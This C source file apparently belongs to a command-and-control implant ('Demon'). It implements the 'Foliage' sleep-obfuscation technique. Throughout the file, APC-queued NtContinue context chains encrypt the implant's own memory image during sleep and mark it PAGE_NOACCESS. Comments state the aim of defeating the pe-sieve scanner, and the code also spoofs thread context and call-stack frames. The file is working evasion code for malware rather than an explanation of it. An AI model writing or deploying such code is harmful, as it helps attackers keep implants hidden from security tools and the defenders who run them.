#ifdef SLEEPOBF_USE_FOLIAGE

#include <Demon.h>

#include <common/Macros.h>
#include <core/SleepObf.h>
#include <core/PeProtect.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Thread.h>

#include <rpcndr.h>
#include <ntstatus.h>

#if _WIN64

/*!
 * @brief
 *  foliage is a sleep obfuscation technique that is using APC calls
 *  to obfuscate itself in memory
 *
 * @param Param
 * @return
 */
VOID FoliageObf(
    IN PSLEEP_PARAM Param
) {
    USTRING             Key         = { 0 };
    USTRING             Rc4         = { 0 };
    UCHAR               Random[44]  = { 0 };  /* max for ChaCha20: 32-byte key + 12-byte nonce */

    HANDLE              hEvent      = NULL;
    HANDLE              hThread     = NULL;
    HANDLE              hDupObj     = NULL;

    PRINTF( "FoliageObf: ENTRY TimeOut=%u ms\n", Param->TimeOut )

    // Rop Chain Thread Ctx
    PCONTEXT            RopInit     = { 0 };
    PCONTEXT            RopCap      = { 0 };
    PCONTEXT            RopSpoof    = { 0 };

    PCONTEXT            RopBegin     = { 0 };
    PCONTEXT            RopSetMemRw  = { 0 };
    PCONTEXT            RopMemEnc    = { 0 };
    PCONTEXT            RopSetMemNA  = { 0 };
    PCONTEXT            RopGetCtx    = { 0 };
    PCONTEXT            RopSetCtx    = { 0 };
    PCONTEXT            RopWaitObj   = { 0 };
    PCONTEXT            RopSetMemRw2 = { 0 };
    PCONTEXT            RopMemDec    = { 0 };
    PCONTEXT            RopSetMemRx  = { 0 };
    PCONTEXT            RopSetCtx2   = { 0 };
    PCONTEXT            RopExitThd   = { 0 };

    LPVOID              ImageBase   = NULL;
    SIZE_T              ImageSize   = 0;
    LPVOID              TxtBase     = NULL;
    SIZE_T              TxtSize     = 0;
    DWORD               dwProtect   = PAGE_EXECUTE_READWRITE;
    SIZE_T              TmpValue    = 0;

    ImageBase = Instance->Session.ModuleBase;
    ImageSize = Instance->Session.ModuleSize;

    // Check if .text section is defined
    if (Instance->Session.TxtBase != 0 && Instance->Session.TxtSize != 0) {
        TxtBase = Instance->Session.TxtBase;
        TxtSize = Instance->Session.TxtSize;
        dwProtect  = PAGE_EXECUTE_READ;
    } else {
        TxtBase = Instance->Session.ModuleBase;
        TxtSize = Instance->Session.ModuleSize;
    }

    /* Generate random key; length depends on cipher: 16 bytes for RC4, 44 bytes for ChaCha20 */
    DWORD KeyLen = ( Instance->Config.Implant.SleepCipher == SLEEP_CIPHER_CHACHA20 ) ? 44 : 16;
    for ( SHORT i = 0; i < (SHORT)KeyLen; i++ )
        Random[ i ] = (UCHAR)RandomNumber32();

    Key.Buffer = &Random;
    Key.Length = Key.MaximumLength = (WORD)KeyLen;

    Rc4.Buffer = ImageBase;
    Rc4.Length = Rc4.MaximumLength = ImageSize;

    PRINTF( "FoliageObf: ImageBase=%p ImageSize=%llu TxtBase=%p TxtSize=%llu\n",
            ImageBase, (unsigned long long) ImageSize, TxtBase, (unsigned long long) TxtSize )

    if ( NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
    {
        PRINTF( "FoliageObf: NtCreateEvent OK hEvent=%p\n", hEvent )
        if ( NT_SUCCESS( SysNtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance->Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL ) ) )
        {
            PRINTF( "FoliageObf: NtCreateThreadEx OK hThread=%p (suspended)\n", hThread )
            RopInit     = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopCap      = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSpoof    = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );

            RopBegin     = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemRw  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopMemEnc    = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemNA  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopGetCtx    = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetCtx    = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopWaitObj   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemRw2 = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopMemDec    = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemRx  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetCtx2   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopExitThd   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );

            RopInit->ContextFlags       = CONTEXT_FULL;
            RopCap->ContextFlags        = CONTEXT_FULL;
            RopSpoof->ContextFlags      = CONTEXT_FULL;

            RopBegin->ContextFlags      = CONTEXT_FULL;
            RopSetMemRw->ContextFlags   = CONTEXT_FULL;
            RopMemEnc->ContextFlags     = CONTEXT_FULL;
            RopSetMemNA->ContextFlags   = CONTEXT_FULL;
            RopGetCtx->ContextFlags     = CONTEXT_FULL;
            RopSetCtx->ContextFlags     = CONTEXT_FULL;
            RopWaitObj->ContextFlags    = CONTEXT_FULL;
            RopSetMemRw2->ContextFlags  = CONTEXT_FULL;
            RopMemDec->ContextFlags     = CONTEXT_FULL;
            RopSetMemRx->ContextFlags   = CONTEXT_FULL;
            RopSetCtx2->ContextFlags    = CONTEXT_FULL;
            RopExitThd->ContextFlags    = CONTEXT_FULL;

            PUTS( "FoliageObf: ROP CONTEXTs allocated, duplicating thread" )
            if ( NT_SUCCESS( SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupObj, THREAD_ALL_ACCESS, 0, 0 ) ) )
            {
                PRINTF( "FoliageObf: NtDuplicateObject OK hDupObj=%p\n", hDupObj )
                if ( NT_SUCCESS( Instance->Win32.NtGetContextThread( hThread, RopInit ) ) )
                {
                    PRINTF( "FoliageObf: NtGetContextThread OK Rsp=%p Rip=%p\n", (PVOID) RopInit->Rsp, (PVOID) RopInit->Rip )
                    MemCopy( RopBegin,     RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemRw,  RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopMemEnc,    RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemNA,  RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopGetCtx,    RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetCtx,    RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopWaitObj,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemRw2, RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopMemDec,    RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemRx,  RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetCtx2,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopExitThd,   RopInit, sizeof( CONTEXT ) );

                    RopBegin->ContextFlags = CONTEXT_FULL;
                    RopBegin->Rip  = U_PTR( Instance->Win32.NtWaitForSingleObject );
                    RopBegin->Rsp -= U_PTR( 0x1000 * 13 );
                    RopBegin->Rcx  = U_PTR( hEvent );
                    RopBegin->Rdx  = U_PTR( FALSE );
                    RopBegin->R8   = U_PTR( NULL );
                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtWaitForSingleObject( Evt, FALSE, NULL )

                    RopSetMemRw->ContextFlags = CONTEXT_FULL;
                    RopSetMemRw->Rip  = U_PTR( Instance->Win32.NtProtectVirtualMemory );
                    RopSetMemRw->Rsp -= U_PTR( 0x1000 * 12 );
                    RopSetMemRw->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemRw->Rdx  = U_PTR( &ImageBase );
                    RopSetMemRw->R8   = U_PTR( &ImageSize );
                    RopSetMemRw->R9   = U_PTR( PAGE_READWRITE );
                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( &TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );

                    RopMemEnc->ContextFlags = CONTEXT_FULL;
                    RopMemEnc->Rip  = U_PTR( Instance->Win32.SleepCipherFunc );
                    RopMemEnc->Rsp -= U_PTR( 0x1000 * 11 );
                    RopMemEnc->Rcx  = U_PTR( &Rc4 );
                    RopMemEnc->Rdx  = U_PTR( &Key );
                    *( PVOID* )( RopMemEnc->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    /* SleepCipherFunc( &Rc4, &Key ); Encryption */

                    // PAGE_NOACCESS: prevent pe-sieve from reading/measuring entropy of encrypted region
                    RopSetMemNA->ContextFlags = CONTEXT_FULL;
                    RopSetMemNA->Rip  = U_PTR( Instance->Win32.NtProtectVirtualMemory );
                    RopSetMemNA->Rsp -= U_PTR( 0x1000 * 10 );
                    RopSetMemNA->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemNA->Rdx  = U_PTR( &ImageBase );
                    RopSetMemNA->R8   = U_PTR( &ImageSize );
                    RopSetMemNA->R9   = U_PTR( PAGE_NOACCESS );
                    *( PVOID* )( RopSetMemNA->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    *( PVOID* )( RopSetMemNA->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( &TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_NOACCESS, &TmpValue );

                    RopGetCtx->ContextFlags = CONTEXT_FULL;
                    RopGetCtx->Rip  = U_PTR( Instance->Win32.NtGetContextThread );
                    RopGetCtx->Rsp -= U_PTR( 0x1000 * 9 );
                    RopGetCtx->Rcx  = U_PTR( hDupObj );
                    RopGetCtx->Rdx  = U_PTR( RopCap );
                    *( PVOID* )( RopGetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtGetContextThread( Src, Cap );

                    RopSetCtx->ContextFlags = CONTEXT_FULL;
                    RopSetCtx->Rip  = U_PTR( Instance->Win32.NtSetContextThread );
                    RopSetCtx->Rsp -= U_PTR( 0x1000 * 8 );
                    RopSetCtx->Rcx  = U_PTR( hDupObj );
                    RopSetCtx->Rdx  = U_PTR( RopSpoof );
                    *( PVOID* )( RopSetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtSetContextThread( Src, Spf );

                    // NOTE: Here is the thread sleeping...
                    RopWaitObj->ContextFlags = CONTEXT_FULL;
                    RopWaitObj->Rip  = U_PTR( Instance->Win32.WaitForSingleObjectEx );
                    RopWaitObj->Rsp -= U_PTR( 0x1000 * 7 );
                    RopWaitObj->Rcx  = U_PTR( hDupObj );
                    RopWaitObj->Rdx  = U_PTR( Param->TimeOut );
                    RopWaitObj->R8   = U_PTR( FALSE );
                    /* [RSP+0] must be NtTestAlert — required for APC chain delivery after WaitForSingleObjectEx returns */
                    /* fake frames at [RSP+8], [RSP+16] make pe-sieve see a plausible callstack depth */
                    *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = C_PTR( Instance->Win32.BaseThreadInitThunk );
                    *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = C_PTR( Instance->Win32.RtlUserThreadStart );
                    *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x3 ) ) = C_PTR( 0 );
                    // WaitForSingleObjectEx( Src, Fbr->Time, FALSE );

                    // PAGE_READWRITE restore: re-enable access before decryption
                    RopSetMemRw2->ContextFlags = CONTEXT_FULL;
                    RopSetMemRw2->Rip  = U_PTR( Instance->Win32.NtProtectVirtualMemory );
                    RopSetMemRw2->Rsp -= U_PTR( 0x1000 * 6 );
                    RopSetMemRw2->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemRw2->Rdx  = U_PTR( &ImageBase );
                    RopSetMemRw2->R8   = U_PTR( &ImageSize );
                    RopSetMemRw2->R9   = U_PTR( PAGE_READWRITE );
                    *( PVOID* )( RopSetMemRw2->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    *( PVOID* )( RopSetMemRw2->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( &TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, &TmpValue );

                    // NOTE: thread image decryption
                    RopMemDec->ContextFlags = CONTEXT_FULL;
                    RopMemDec->Rip  = U_PTR( Instance->Win32.SleepCipherFunc );
                    RopMemDec->Rsp -= U_PTR( 0x1000 * 5 );
                    RopMemDec->Rcx  = U_PTR( &Rc4 );
                    RopMemDec->Rdx  = U_PTR( &Key );
                    *( PVOID* )( RopMemDec->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    /* SleepCipherFunc( &Rc4, &Key ); Decryption */

                    // RW -> RX
                    RopSetMemRx->ContextFlags = CONTEXT_FULL;
                    RopSetMemRx->Rip  = U_PTR( Instance->Win32.NtProtectVirtualMemory );
                    RopSetMemRx->Rsp -= U_PTR( 0x1000 * 4 );
                    RopSetMemRx->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemRx->Rdx  = U_PTR( &TxtBase );
                    RopSetMemRx->R8   = U_PTR( &TxtSize );
                    RopSetMemRx->R9   = U_PTR( dwProtect );
                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( &TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Txt, &Len, PAGE_EXECUTE_READ, &TmpValue );

                    RopSetCtx2->ContextFlags = CONTEXT_FULL;
                    RopSetCtx2->Rip  = U_PTR( Instance->Win32.NtSetContextThread );
                    RopSetCtx2->Rsp -= U_PTR( 0x1000 * 3 );
                    RopSetCtx2->Rcx  = U_PTR( hDupObj );
                    RopSetCtx2->Rdx  = U_PTR( RopCap );
                    *( PVOID* )( RopSetCtx2->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtSetContextThread( Src, Cap );

                    RopExitThd->ContextFlags = CONTEXT_FULL;
                    RopExitThd->Rip  = U_PTR( Instance->Win32.RtlExitUserThread );
                    RopExitThd->Rsp -= U_PTR( 0x1000 * 2 );
                    RopExitThd->Rcx  = U_PTR( ERROR_SUCCESS );
                    *( PVOID* )( RopExitThd->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // RtlExitUserThread( ERROR_SUCCESS );

                    PUTS( "FoliageObf: 12 ROP entries built, queueing APCs" )

                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopBegin,     FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopBegin FAILED" );     goto Leave; }
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRw,  FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopSetMemRw FAILED" );  goto Leave; }
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemEnc,    FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopMemEnc FAILED" );    goto Leave; }
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemNA,  FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopSetMemNA FAILED" );  goto Leave; }
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopGetCtx,    FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopGetCtx FAILED" );    goto Leave; }
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx,    FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopSetCtx FAILED" );    goto Leave; }
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopWaitObj,   FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopWaitObj FAILED" );   goto Leave; }
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRw2, FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopSetMemRw2 FAILED" ); goto Leave; }
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemDec,    FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopMemDec FAILED" );    goto Leave; }
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRx,  FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopSetMemRx FAILED" );  goto Leave; }
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx2,   FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopSetCtx2 FAILED" );   goto Leave; }
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopExitThd,   FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopExitThd FAILED" );   goto Leave; }

                    PUTS( "FoliageObf: all 12 APCs queued, resuming thread" )
                    if ( NT_SUCCESS( SysNtAlertResumeThread( hThread, NULL ) ) )
                    {
                        RopSpoof->ContextFlags = CONTEXT_FULL;
                        RopSpoof->Rip = U_PTR( Instance->Win32.WaitForSingleObjectEx );
                        /* write fake frames just below StackBase and point RSP there */
                        PVOID FakeFrames = C_PTR( U_PTR( Instance->Teb->NtTib.StackBase ) - 0x50 );
                        *( PVOID* )( U_PTR( FakeFrames ) + 0x00 ) = C_PTR( Instance->Win32.BaseThreadInitThunk );
                        *( PVOID* )( U_PTR( FakeFrames ) + 0x08 ) = C_PTR( Instance->Win32.RtlUserThreadStart );
                        *( PVOID* )( U_PTR( FakeFrames ) + 0x10 ) = NULL;
                        RopSpoof->Rsp = U_PTR( FakeFrames );

                        PUTS( "FoliageObf: signaling event and waiting for thread to exit" )
                        PeProtect_Stomp();
                        // Execute every registered Apc thread
                        SysNtSignalAndWaitForSingleObject( hEvent, hThread, FALSE, NULL );
                        PeProtect_Restore();
                        PUTS( "FoliageObf: thread exited, sleep cycle complete" )
                    } else {
                        PUTS( "FoliageObf: NtAlertResumeThread FAILED" )
                    }
                } else {
                    PUTS( "FoliageObf: NtGetContextThread FAILED" )
                }
            } else {
                PUTS( "FoliageObf: NtDuplicateObject FAILED" )
            }

        } else {
            PUTS( "FoliageObf: NtCreateThreadEx FAILED" )
        }
    } else {
        PUTS( "FoliageObf: NtCreateEvent FAILED" )
    }

Leave:
    PUTS( "FoliageObf: cleanup begin" )
    if ( RopExitThd != NULL ) {
        Instance->Win32.LocalFree( RopExitThd );
        RopExitThd = NULL;
    }

    if ( RopSetCtx2 != NULL ) {
        Instance->Win32.LocalFree( RopSetCtx2 );
        RopSetCtx2 = NULL;
    }

    if ( RopSetMemRx != NULL ) {
        Instance->Win32.LocalFree( RopSetMemRx );
        RopSetMemRx = NULL;
    }

    if ( RopMemDec != NULL ) {
        Instance->Win32.LocalFree( RopMemDec );
        RopMemDec = NULL;
    }

    if ( RopSetMemRw2 != NULL ) {
        Instance->Win32.LocalFree( RopSetMemRw2 );
        RopSetMemRw2 = NULL;
    }

    if ( RopWaitObj != NULL ) {
        Instance->Win32.LocalFree( RopWaitObj );
        RopWaitObj = NULL;
    }

    if ( RopSetCtx != NULL ) {
        Instance->Win32.LocalFree( RopSetCtx );
        RopSetCtx = NULL;
    }

    if ( RopGetCtx != NULL ) {
        Instance->Win32.LocalFree( RopGetCtx );
        RopGetCtx = NULL;
    }

    if ( RopSetMemNA != NULL ) {
        Instance->Win32.LocalFree( RopSetMemNA );
        RopSetMemNA = NULL;
    }

    if ( RopMemEnc != NULL ) {
        Instance->Win32.LocalFree( RopMemEnc );
        RopMemEnc = NULL;
    }

    if ( RopSetMemRw != NULL ) {
        Instance->Win32.LocalFree( RopSetMemRw );
        RopSetMemRw = NULL;
    }

    if ( RopBegin != NULL ) {
        Instance->Win32.LocalFree( RopBegin );
        RopBegin = NULL;
    }

    if ( RopSpoof != NULL ) {
        Instance->Win32.LocalFree( RopSpoof );
        RopSpoof = NULL;
    }

    if ( RopCap != NULL ) {
        Instance->Win32.LocalFree( RopCap );
        RopCap = NULL;
    }

    if ( RopInit != NULL ) {
        Instance->Win32.LocalFree( RopInit );
        RopInit = NULL;
    }

    if ( hDupObj != NULL ) {
        SysNtClose( hDupObj );
        hDupObj = NULL;
    }

    if ( hThread != NULL ) {
        SysNtTerminateThread( hThread, STATUS_SUCCESS );
        hThread = NULL;
    }

    if ( hEvent != NULL ) {
        SysNtClose( hEvent );
        hEvent = NULL;
    }

    MemSet( &Rc4, 0, sizeof( USTRING ) );
    MemSet( &Key, 0, sizeof( USTRING ) );
    MemSet( &Random, 0, 0x10 );

    PUTS( "FoliageObf: EXIT, switching back to master fiber" )
    Instance->Win32.SwitchToFiber( Param->Master );
}

#endif /* _WIN64 */

#endif /* SLEEPOBF_USE_FOLIAGE */
